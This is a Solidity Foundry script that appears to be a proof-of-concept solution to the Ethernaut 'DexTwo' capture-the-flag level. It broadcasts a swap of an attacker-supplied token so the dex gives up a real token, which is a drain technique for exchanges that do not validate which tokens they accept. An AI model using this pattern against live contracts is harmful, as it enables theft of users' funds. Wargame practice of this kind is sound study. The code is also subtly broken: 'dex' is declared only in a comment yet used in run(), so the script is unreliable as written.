// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "Ethernaut/dextwo.sol";

contract DexTwoPocScript is Script
{
  function run() public
  {
    uint256 deployerKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(deployerKey);

    // DexTwo dex = DexTwo(0xC89915BA762F304A47d82c6EFc210214042c60d5);

    // dex.approve(0xC89915BA762F304A47d82c6EFc210214042c60d5, 1000);

    // SwappableTokenTwo token3 = SwappableTokenTwo(0x4b97216504F567dCB44D9Fc3d5D66c7e75283268);
    // token3.approve(0xC89915BA762F304A47d82c6EFc210214042c60d5, 2000);

    address token1 = 0x4872a57d7FA73A44A6da117A5a0777B3d6216340;
    address token2 = 0x0B1ebf7D3F1cD1c647FCeb1AaE10129a468435c9;
    address token3 = 0x4b97216504F567dCB44D9Fc3d5D66c7e75283268;

    address player = 0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B;
    // dex.swap(token2, token3, dex.balanceOf(token2, player));
    dex.swap(token3, token2, 1258);

    vm.stopBroadcast();
  }

  function transferToDex() private
  {
    SwappableTokenTwo token3 = SwappableTokenTwo(0x4b97216504F567dCB44D9Fc3d5D66c7e75283268);
    token3.transfer(0xC89915BA762F304A47d82c6EFc210214042c60d5, 100);
  }

}
